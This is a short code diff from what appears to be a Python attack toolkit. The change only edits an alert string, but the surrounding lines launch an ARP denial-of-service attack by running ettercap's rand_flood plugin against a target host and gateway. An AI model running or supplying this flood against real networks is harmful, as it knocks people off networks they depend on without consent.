@@ -37,7 +37,7 @@ def init():
 def main(run):
 
 	if isConect() and checkDevice(init.var['interface']):
-		printAlert(0,"Starting ARP DOS attack...")
+		printAlert(0,"Starting ARP D.O.S attack...")
 		Subprocess("ettercap -Tq -P rand_flood /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
 		raw_input(printAlert(8,"for Stop ARP D.O.S Attack (PRESS [ENTER])\n"))
 		commands.getoutput("killall ettercap")	
